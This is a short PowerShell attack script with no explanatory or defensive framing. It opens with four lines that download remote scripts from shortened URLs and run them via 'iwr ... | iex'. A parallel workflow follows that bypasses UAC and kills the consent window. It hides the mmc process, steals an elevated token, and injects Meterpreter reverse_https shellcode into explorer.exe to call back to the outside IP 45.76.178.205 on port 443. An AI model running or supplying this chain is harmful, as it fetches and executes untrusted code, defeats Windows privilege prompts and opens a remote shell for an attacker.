iwr https://goo.gl/x6ZcHM | iex;
iwr https://goo.gl/CB7F6k | iex;
iwr https://goo.gl/wxJHHq | iex;
iwr https://goo.gl/4QsWoj | iex;

workflow Test
{
    Parallel
    {
        Bypass-UAC -Method UacMethodNetOle32;
        
        sleep 3; kill-window consent;
        sleep 2; hide-process mmc;
        sleep 1; UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -ProcPID (ps -Name mmc).id;
        sleep 2; $cmd="Invoke-Shellcode -ProcessId $((ps -Name explorer.exe).id) -Payload windows/meterpreter/reverse_https -Lhost  45.76.178.205 -Lport 443;"
        sleep 4; send-keys -Name $cmd -Cmd $cmd
    }
}
